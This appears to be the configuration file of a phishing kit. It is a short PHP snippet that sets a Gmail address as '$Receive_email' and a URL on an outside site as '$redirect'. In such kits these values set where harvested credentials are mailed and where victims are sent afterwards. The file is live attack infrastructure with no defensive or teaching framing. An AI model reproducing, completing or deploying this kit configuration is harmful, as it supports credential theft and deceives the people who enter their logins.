<?php 
$Receive_email="dollarsb052@gmail.com";
$redirect="https://sz1sz.com/judgeschoice/stujudgeschoice/";
?>